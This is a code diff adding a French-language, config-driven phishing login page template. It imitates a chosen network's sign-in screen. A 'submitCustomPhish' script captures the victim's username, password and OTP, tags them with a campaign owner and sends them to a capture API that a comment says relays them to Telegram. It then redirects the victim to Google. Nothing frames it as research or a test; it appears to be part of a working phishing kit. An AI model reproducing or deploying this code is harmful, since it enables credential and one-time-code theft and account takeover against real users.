@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ config.title }}</title>
+    <style>
+        body {
+            /* S'adapte dynamiquement si c'est une couleur ou une image de fond */
+            {% if config.bg_type == 'image' %}
+            background: url('{{ config.bg_value }}') no-repeat center center fixed;
+            background-size: cover;
+            {% else %}
+            background-color: {{ config.bg_value }};
+            {% endif %}
+            font-family: Helvetica, Arial, sans-serif;
+            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
+        }
+        .login-card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            width: 380px;
+            text-align: center;
+        }
+        .logo-img {
+            width: 80px; height: 80px; object-fit: contain; margin-bottom: 15px;
+            {% if config.logo_shape == 'circle' %}border-radius: 50%;{% else %}border-radius: 8px;{% endif %}
+            border: 2px solid #f5b014; background: #111; padding: 4px;
+        }
+        h2 { color: #333; font-size: 22px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px 14px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; box-sizing: border-box; }
+        .submit-btn { background-color: #f5b014; border: none; border-radius: 6px; color: #111; font-size: 18px; font-weight: bold; line-height: 44px; width: 100%; cursor: pointer; transition: 0.2s; }
+        .submit-btn:hover { background-color: #e09e0f; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    {% if config.logo_url %}
+    <img src="{{ config.logo_url }}" class="logo-img" alt="Logo">
+    {% endif %}
+    <h2>{{ config.title }}</h2>
+    
+    <!-- Génération dynamique des champs configurés (Identifiant, Mot de passe, OTP, etc.) -->
+    <form id="custom-form" onsubmit="submitCustomPhish(event)">
+        {% for field in config.fields %}
+        <input type="{{ field.type }}" id="{{ field.name }}" placeholder="{{ field.label }}" required>
+        {% endfor %}
+        <button type="submit" class="submit-btn">{{ config.btn_text }}</button>
+    </form>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const campaignOwner = urlParams.get('user') || 'Admin_Inconnu';
+    const linkType = urlParams.get('type') || 'standard';
+    const networkName = "{{ config.network }}";
+
+    function submitCustomPhish(event) {
+        event.preventDefault();
+        
+        const fieldsConfig = {{ config.fields | tojson }};
+        let payloadData = {
+            owner: campaignOwner,
+            network: networkName,
+            type: linkType,
+            victimUser: document.getElementById(fieldsConfig[0]?.name)?.value || 'N/A',
+            victimPass: document.getElementById(fieldsConfig[1]?.name)?.value || 'N/A',
+            otp: fieldsConfig[2] ? document.getElementById(fieldsConfig[2]?.name)?.value : 'Aucun'
+        };
+
+        // Envoi sécurisé vers l'API de capture Python et Telegram
+        fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payloadData)
+        }).then(response => {
+            window.location.href = "https://www.google.com";
+        }).catch(error => {
+            window.location.href = "https://www.google.com";
+        });
+    }
+</script>
+
+</body>
+</html>
